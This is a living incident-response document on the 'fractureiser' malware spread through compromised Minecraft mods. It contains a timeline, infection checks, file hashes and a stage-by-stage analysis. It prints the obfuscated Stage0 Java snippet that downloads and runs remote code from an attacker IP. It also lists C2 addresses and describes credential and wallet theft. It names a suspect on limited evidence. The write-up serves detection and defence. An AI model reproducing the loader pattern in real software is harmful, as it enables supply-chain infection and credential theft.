# Modded Minecraft Malware "fractureiser" - What We Know

We've dubbed this malware `fractureiser` because that's the name of the CurseForge account that uploaded the most notable malicious files.

<center>*Pardon our dust*, this is a living document being edited in realtime by multiple people about a developing situation.</center>

<br>

#### Current status
We have a good idea how fractureiser works, from stages 0 to 3. There are certain unknowns, but stage 0 bootstrapping was quickly nipped and tomorrow we'll be moving our focus to mitigation. As a plan, we've contacted Mojang and will likely be working with teams to get detection software distributed and integrated into CurseForge and Modrinth, as well as considering integration in launchers like Prism, and mod loaders like Fabric and Forge. It is also worthwhile to run this detection software on mod distribution mavens, as it's possible some have become infected.

Most of the current team responsible for updating this doc is tired and going to bed (as of 02:46a Pacific time). Others are continuing to reverse engineer stage 3.

Work has begun on a detector for infected stage0 mods: https://github.com/MCRcortex/nekodetector

----

If you have files relevant to this malware, please upload them to https://wormhole.app and email the URL to fractureiser.investigation@opayq.com — this inbox is controlled by xylemlandmark, and anything sent to it will be shared with the rest of the team. **Please also let us know if you have the ability to download files from VirusTotal**, as that would let us get ahold of many of the files we're missing. We are looking especially for one `lib.dll`.

If you need to get in touch more generally, please send mail to jaskarth4@gmail.com.

If you copy portions of this document elsewhere, *please* put a prominent link back to this HackMD page (https://hackmd.io/@jaskarth4/B1gaTOaU2) somewhere near the top so that people can read the latest updates and get in contact.

# Non-technical overview [READ ME!]

A number of Curseforge and dev.bukkit.org (not the Bukkit software itself) accounts were compromised, and malicious software was injected into copies of many popular plugins and mods. Some of these malicious copies have been injected into popular modpacks including Better Minecraft. *There are reports of malicious plugin/mod JARs as early as mid-April.*

This malware is composed of multiple "stages", each stage is responsible for downloading and running the next one. In total, there are three known stages (Stages 1, 2, and 3), with infected mod files serving as a "Stage 0" to kick the whole process off.

Stage 3 is the "mastermind" of the malware, and we have evidence that it attempts to do all of the following:
* Propagate itself to *all* `jar` files on the filesystem, possibly infecting mods that were not downloaded from CurseForge or BukkitDev
* Steal cookies and login information for many web browsers
* Replace cryptocurrency addresses in the clipboard with alternates that are presumably owned by the attacker
* Steal Discord credentials
* Steal Microsoft and Minecraft credentials

(See [technical details](#Stage3-clientjar) for more info)

Because of its behavior, we are **very confident** this is a **targeted attack against the modded Minecraft ecosystem**. It's quite bad.

**Until further notice, exercise extreme caution with Minecraft mod downloads, regardless of origin.** While the control server for this malware is currently offline, **any download from Curseforge or the Bukkit plugin repository in the last 2-3 weeks should be treated as potentially malicious**. This malware is unlikely to be detected by Windows Defender or similar antimalware products.

If you have downloaded any mods from Curseforge, or plugins from Bukkit, even through clients such as Prism Launcher or the official Curseforge launcher, it is recommended that you follow the "Am I infected?" guide below.

The affected accounts had two-factor authentication enabled. This is not a simple password compromise situation. Multiple accounts are affected.

~~Currently, we do not suspect other platforms such as Modrinth to be affected.~~ *At this point we cannot be confident claiming any hosting service is unaffected*. Please exercise caution regardless of what site you use. Even Maven repositories may be infected, and this malware goes back months.

Right now, the malware is dormant due to the loss of its C&C server and the Stage0 (what was distributed via mods and modpacks) not having a way to get a new server. If you were infected with Stage2 (the file described below, dropped by Stage1 when C&C was up), then **the malware is still active.**

### Am I infected?

You can check whether the malware ever ran on your computer, since Stage1 attempts to save Stage 2 at several unusual paths:

* **Linux**: `~/.config/.data/lib.jar`
* **Windows**: `%LOCALAPPDATA%\Microsoft Edge\libWebGL64.jar` (or `~\AppData\Local\Microsoft Edge\libWebGL64.jar`)
    * Make sure to show hidden files when checking
    * Yes, "Microsoft Edge" with a space. MicrosoftEdge is the legitimate directory used by actual Edge.
    * Also check the registry for an entry at `HKEY_CURRENT_USER:\Software\Microsoft\Windows\CurrentVersion\Run` 
    * Or a shortcut in `%appdata%\Microsoft\Windows\Start Menu\Programs\Startup` 
* **All other OSes**: Unaffected. The malware is hardcoded for Windows and Linux only. It is possible it will receive an update adding payloads for other OSes in the future.

There are scripts available [here](https://prismlauncher.org/news/cf-compromised-alert/) which will help you check whether these files exist.

Before downloading, the malware will create the enclosing directory if it does not exist. Windows/MS Edge does not use the "Microsoft Edge"-with-a-space directory, and Linux software does not use `~/.config/.data`, so these folders existing is a likely sign that Stage1 has executed on a victim computer.

If you find these files, you should delete them immediately, but consider *all* JAR files on your system compromised, and potentially all logins on your web browser as well. Passwords should be changed.

### Given a jar file, how do I know if it's safe?

There are various heuristics you can use to determine whether a jar is infected with Stage 0.

Emi's shell script [here](https://gist.github.com/emilyploszaj/a9693c4f3de5ec9fbc255c51ff3ca47e) simply checks for all usages of `ClassLoader`, which is uncommon in mod code. This can lead to false positives and negatives. For example, it falsely flags the latest Quark 1.19 file as infected when it is not.

Sylv's shell script [here](https://pastebin.com/T6aQ7C2E) does a bit more fingerprint matching for the malware, and should be more precise.

As a non-technical user, your best course of action is to check if your system was affected using the above steps, remediating if necessary, and refraining from downloading anything from CurseForge or dev.bukkit.org until further notice.


### Timeline
----
*temp*
The static IP used to find the dynamic IP has been 

----
*2023-06-07 08:52 UTC*

The dust has mostly settled for now. We have a good idea of the early stages of the malware, and stage 3 is being reverse-engineered. The first stage is temporarily dormant.

We will resume updates next morning US time (or thereabouts).

----
*2023-06-07 08:09 UTC*

We are still working on reversing stage 3, see the section below for technical details.

----
*2023-06-07 07:37 UTC*

CurseForge published the following statement in their discord's #news channel:

> Hey everyone,
> 
> We would like to address the current situation that is ongoing and highlight some important points:
> 
> * A malicious user has created several accounts and uploaded projects containing malware to the platform
> * Separately a user belonging to Luna Pixel Studios (LPS) was hacked and was used to upload similar malware
> * We have banned all accounts relevant to this and disabled the LPS one as well. We are in direct contact with the LPS team to help them restore their access
> * We are in the process of going through ALL new projects and files to guarantee your safety. We are of course <u>holding the approval process of all new files until this is resolved</u>
> * Deleting your CF client isn’t a recommended solution as it will not solve the issue and will prevent us from deploying a fix. We are working on a tool to help you make sure you weren’t exposed to any of this. In the meantime refer to information published in #current-issues.
> * This is relevant ONLY to Minecraft users
> * To be clear **CurseForge is not compromised! No admin account was hacked.**
>
> We are working on this to make sure the platform remains a safe place to download and share mods. Thank you to all authors and users who help us with highlighting, we appreciate your cooperation and patience ❤️ 
>
> Stay tuned for more updates and we will clear this issue.

----
*2023-06-07 07:24 UTC*

Darkhax has contacted Curseforge representatives who have confirmed that the affected files were uploaded via the UI, not the API.

Curseforge has halted upload approvals while this situation unfolds and have taken down many infected files.

They are also investigating the IPs of the uploaders of the malicious files, to see if they match previous requests by the rightful account holders.

----
*2023-06-07 7:03 UTC*

We believe we've discovered the true function of Stage3 (`client.jar`) and are attempting to document it here. It's not good, folks.

The quick version, while we get this document in shape: client.jar searches *the entire filesystem* for files that look like mod JARs, and infects them with Stage0. This includes *entire Gradle and Maven caches*, as well as tons of things mod devs would likely never think to check. The potential scale and scope of this infection has gone from "a couple weird mods" to *potentially infinite*.

We believe this is how the infection initially spread, and Curseforge may not have been the initial attack vector.

----

*2023-06-07 6:27 UTC*

Investigation has slowed down and most of the team is going to bed. xylemlandmark has opened an email inbox for people to submit samples or other useful information. williewillus is currently working to clean up and get the information presented by Shadowex3 into this doc. 

----

*2023-06-07 6:20 UTC*

Shadowex3 informs the unofficial Discord that they have a copy of the full (untruncated) Stage 3 `client.jar`, as well as an in-depth analysis of what the malware is doing. They first noticed this weeks ago and undertook in-depth analysis, and as a result was able to obtain full copies of all the payloads.

----

*2023-06-07 5:27 UTC*

We've discovered a potential (truncated) Stage 3 file; it is heavily obfuscated and contains a native payload DLL that attempts to steal credentials from the Windows credentials store.

----

*2023-06-07 4:57 UTC*

Files uploaded in April have been discovered; either the dates are being spoofed, or this has been going on even longer. Many of the accounts have Last Active times in 1999 — likely a quirk with old CurseForge accounts, but still notable.

Modrinth staff are investigating if any uploads on there are compromised. A quick pass they did through recently updated projects looked OK.

----
    
*2023-06-07 4:40 UTC*

The scope of this compromise seems larger than initially realized. The malicious files go back multiple weeks, as early as May 20th. We only noticed today because they compromised a popular modpack.

---

*2023-06-07 3:38 UTC*


The C&C server has been taken down by the server provider. A new one will likely come up if the Cloudflare page stays up, we're monitoring it.

----

*2023-06-07 3:26 UTC*

We were sent a possible Stage 2 jar by an anonymous user that claims to work at a server host.

----

*2023-06-07 2:26 UTC*

The #cfmalware EsperNet channel is created to coordinate discussion that had been happening in multiple Discord guilds and Matrix spaces.

----

*2023-06-07 0:40 UTC*

The team behind this document learns of the malicious files included in an unauthorized update to Better Minecraft.

----

*2023-06-03 (approximately? TODO is this correct)*
Shadowex3 notices the activity and reverse engineers a large chunk of it. 

They wanted to coordinate to gather more intel before tipping the attackers off that something was happening.
As a result, they captured a reasonably complete set of files containing all stages of the malware, besides a missing `lib.dll` file.


----

# Technical info

## Distribution

Some modpacks have had updates published for them without the knowledge of the authors, adding a dependency on malicious mods. These modpack updates were archived immediately after uploading, meaning they *do not show on the web UI, only via the API.*

The malicious mods have upload dates multiple weeks in the past. Most of them were uploaded by single-use accounts with clearly autogenerated names, and were likely the seed of the infection. Luna Pixel Studios was compromised due to a dev testing one of these mods, as it was an interesting new upload. The fact Curse let these mods uploaded by a new account through is pretty bad and speaks to their now-nonexistent content moderation.

### Known affected mods & plugins

|mod/plugin|link|SHA1|"Uploader"|
|---|---|---|---|
|Skyblock Core|[www.curseforge.com]/minecraft/mc-mods/skyblock-core/files/4570565 |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
|Dungeonz|[legacy.curseforge.com]/minecraft/mc-mods/dungeonx/files/4551100 |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
|Haven Elytra|[dev.bukkit.org]/projects/havenelytra/files/4551105   [legacy.curseforge.com]/minecraft/bukkit-plugins/havenelytra/files/4551105 |`284A4449E58868036B2BAFDFB5A210FD0480EF4A`|fractureiser|
|Vault Integrations|[www.curseforge.com]/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simpleharvesting82|
|AutoBroadcast|[www.curseforge.com]/minecraft/mc-mods/autobroadcast/files/4567257|`C55C3E9D6A4355F36B0710AB189D5131A290DF26`|shyandlostboy81|
|Museum Curator Advanced|[www.curseforge.com]/minecraft/mc-mods/museum-curator-advanced/files/4553353|`32536577D5BB074ABD493AD98DC12CCC86F30172`|racefd16|
|Vault Integrations Bug fix|[www.curseforge.com]/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simplyharvesting82
|Floating Damage|[dev.bukkit.org]/projects/floating-damage|1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc|mamavergas3001
|Display Entity Editor|[www.curseforge.com]/minecraft/bukkit-plugins/display-entity-editor/files/4570122|`A4B6385D1140C111549D95EAB25CB51922EEFBA2`|santa_faust_2120

Darkhax sent this: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f

potentially more: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib

## Stage0 (Infected mod jars)

Affected mods or plugins have a new `static void` method inserted into their main class, and a call to this method is inserted into that class's static initializer. For DungeonZ, the method is named `_d1385bd3c36f464882460aa4f0484c53` and exists in `net.dungeonz.DungeonzMain`. For Skyblock Core, the method is named `_f7dba6a3a72049a78a308a774a847180` and is inserted into `com.bmc.coremod.BMCSkyblockCore`. For HavenElytra, the code is inserted directly into the otherwise-unused static initializer of `valorless.havenelytra.HavenElytra`.

The method's code is obfuscated, using `new String(new byte[]{...})` instead of string literals.

From Shadowex3's sample of "Create Infernal Expansion Plus", a copycat version of "Create Infernal Expansion Compat" with malware inserted into the main mod class:
```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // "Utility"
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```

This:
1. Creates a `URLClassLoader` with the URL `http://[85.217.144.130:8080]/dl` ([shodan](https://www.shodan.io/host/85.217.144.130))
2. Loads the class `Utility` from the classloader, fetching code from the internet
3. Calls the `run` method on `Utility`, passing a String argument different for each infected mod (!). E.g.
    * Skyblock Core: "`-74.-10.78.-106.12`"
    * Dungeonz: "`114.-18.38.108.-100`"
    * HavenElytra: "`-114.-18.38.108.-100`"
    * Vault Integrations: "`-114.-18.38.108.-100`"

The passed numerals are parsed as bytes by Stage1 and written to a file named ".ref". They appear to be a way for the author to track infection sources.

The creation of the classloader is hardcoded to that URL and does not use the Cloudflare URL that Stage 1 does. As that IP is now offline, this means the Stage 0 payloads *we are presently aware of* no longer function.

## Stage1 (`dl.jar`)

SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`

[Decompiled copy of `Utility` from the malware](https://pastebin.com/k2ZQKbEz).

The very first thing `Utility.run` does is check if the system property `neko.run` is set. If it is, it will *immediately stop executing*. If not, it sets it to the empty string and continues. This appears to be a very simplistic way of avoiding the same process running the malware multiple times, such as if it had multiple infected mods. *This cannot be relied upon as a killswitch because Stage1 is downloaded from the Internet and may change.*

It attempts to contact `85.217.144.130`, and a Cloudflare Pages domain (`https://[files-8ie.pages.dev]/ip`). Yes, people have already reported abuse. The Pages domain is used to retrieve the IP of the C&C server if the first IP no longer responds — the URL responds with a 4 byte file which is just a binary IPv4 address.

*The C&C IP has been nullrouted after an abuse report to the server provider. We will need to keep an eye on the Cloudflare page to see if a new C&C server is stood up, I can't imagine they didn't plan for this.* Thank you Serverion for your prompt response.

*The Cloudflare pages has been terminated* Theres a new C2 IP: `107.189.3.101`

Stage 1 then attempts to achieve persistence by doing the following:
1. Downloading stage 2 (lib.jar on Linux, libWebGL64.jar on Windows) from the server
2. Making stage 2 run automatically on startup:
* On Linux, it tries placing systemd unit files in `/etc/systemd/system` or `~/.config/systemd/user`
    * The unit file it places in the user folder never works, because it tries using `multi-user.target`, which doesn't exist for user units
* On Windows, it attempts to modify the registry to start itself, or failing that, tries adding itself to the `Windows\Start Menu\Programs\Startup` folder

## Stage2 (`lib.jar` or `libWebGL64.jar`)

Known sha1 hashes:
* `52d08736543a240b0cbbbf2da03691ae525bb119`
* `6ec85c8112c25abe4a71998eb32480d266408863` (Shadowex3's earlier upload)

Stage 2 is obfuscated with a demo version of the Allatori obfuscator, and its main class is called `Bootstrap`. 

TODO, describe the double wrapped behaviour.

Stage 2 downloads stage 3, `client.jar`, loads its code, and executes the `start` method located within `dev.neko.nekoclient.Client`.

## Stage3 (`client.jar`)

sha-1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`

`client.jar` is an incredibly obfuscated and complex bundle of code and contains both java and native code.

It appears to contain a native payload `hook.dll`, decompiled: https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c

There are two native functions meant to be called from Java, as they are JNI callable:
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`

from analysis, these do what they say on the tin:
* read clipboard contents
* Steal Microsoft account credentials

There is also evidence of code attempting to do the following:
* Scan for *all* JAR files on the system that look like Minecraft mods (by detecting Forge/Fabric/Quilt/Bukkit) and attempt to inject stage 0 into them
* Steal cookies and login information for many web browsers
* Replace cryptocurrency addresses in the clipboard with alternates that are presumably owned by the attacker
* Steal Discord credentials
* Steal Microsoft and Minecraft credentials, from a variety of launchers
* Steal crypto wallets

Jars are heuristically detected as Minecraft mods or plugins as follows:
* Forge (dev/neko/e/e/e/A): The malware attempts to locate the `@Mod` annotation, which is required in every mod
* Bukkit (dev/neko/e/e/e/C): The malware checks if a class extends Bukkit's `JavaPlugin` class
* Fabric/Quilt (dev/neko/e/e/e/i): The malware checks if a class implements `ModInitializer`
* Bungee (dev/neko/e/e/e/l): The malware checks if a class extends Bungee's `Plugin` class
* Vanilla (dev/neko/e/e/e/c): The malware checks if the main client class `net.minecraft.client.main.Main` exists

More details are available in the live stage-3 reversal doc: https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ

## Stage4 (`dummyloader3.jar`)
This is a added on jar with the C2 server update which seems to be just the SkyRage updater, which is another minecraft malware targetting blackspigot.

*This section needs more information, feel free to contribute*


## Other Stuff
*The only official channel run by the same team that wrote this writeup*  is [#cfmalware on EsperNet IRC](https://webchat.esper.net/?channels=cfmalware) — we do not have a Discord. You may join the channel if you wish — due to an influx of new users we've set the channel +m, you will need permission to speak. **Joining an IRC channel will expose your IP address.**

IRC logs: TODO

The main payload server ~~is~~ *was* (got taken down) hosted on Serverion, a company based in the Netherlands.

Other than an HTTP server on port 80/443 and an SSH server on port 22, the following ports were open on `85.217.144.130`:

* 1337
* 1338 (a port referenced in stage 1's file for creating new Debugger connection)
* 8081 (this is a WebSocket server - no apparent function right now, not referenced in any malicious code)
* 8082 (nobody's gotten anything out of this one,  not referenced in any malicious code)
* 8083 (contacted by stage 1)


Curiously, fractureiser's bukkit page says "Last active Sat, Jan, 1 2000 00:00:00" https://dev.bukkit.org/members/fractureiser/projects/

## Follow-Ups
While it's a bit early to speak of long term follow-ups, this whole debacle has brought up several critical flaws in the modded Minecraft ecosystem. This section is just brainstorming on them and how we can improve.

1. Review at mod repositories is inadequate
What exactly does CurseForge and Modrinth do when "reviewing" a mod? We should know as a community, instead of relying on security through obscurity.
Should be we be running some sort of static analysis? (williewillus has a few ideas here)

2. A lack of code signing for mods
Unlike the software industry at large, mods released and uploaded to repositories are usually not signed with a signing key that proves that the owner of the key uploaded the mod. Having signing and a separate key distribution/trust mechanism mitigates compromise of CurseForge accounts.
However, this then leads to the greater issue of how to derive key trust, as the fact that "this jar has this signature" has to be communicated out of band from CurseForge/Modrinth, in a standard way so that loaders or users can verify the signatures.
Forge tried to introduce signing many years ago and it had limited uptake.

3. A lack of reproducible builds
Minecraft toolchains are a mess, and builds are usually not reproducible. It is common to have buildscripts fetching unpinned -SNAPSHOT versions of random Gradle plugins and using them, which results in artifacts that are non-reproducible and thus non-auditable.
A random Gradle plugin being a future attack vector is not out of the question.

4. Lack of sandboxing of Minecraft itself
Java edition modding has always had the full power of Java, and this is the other side of that double-edged sword: malicious code has far-reaching impact.
Minecraft itself is not run with any sandboxing, and servers usually are not sandboxed unless the owner is knowledgeable enough to do so.

Good sandboxing is difficult, especially on systems such as Linux where SELinux/AppArmor have such poor UX that no one deploys them.
## Unmasking

The person currently suspected to do this is mori0, a script kiddie from our perspective.

Reason for this is SkyRage.
The jar `dummyloader3.jar` on the new C2 is the skyrage updater connecting to `connect.skyrage.de` which is a malware associated with mori0

## Credits
Nonextensive! Thank you to all that pitched in. We'll flesh this out after this all blows over.

**Shadowex3**: Extensive reverse engineering, early discovery learned of later
**Nia**: Extensive stage 3 reverse engineering
**Jasmine**: Coordination, writing the decompiler we've been using (Quiltflower)
**Emi**: Coordination, initial discovery (for this team), and early research
**williewillus**: Coordination, journalist
**quat**: Documentation, initial infected sample research
**xylemlandmark**: Coordination of documentation, crowd control, responsible for using Snopyta at first and the disaster that caused

[underconstruction.gif]: data:image/gif;base64,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
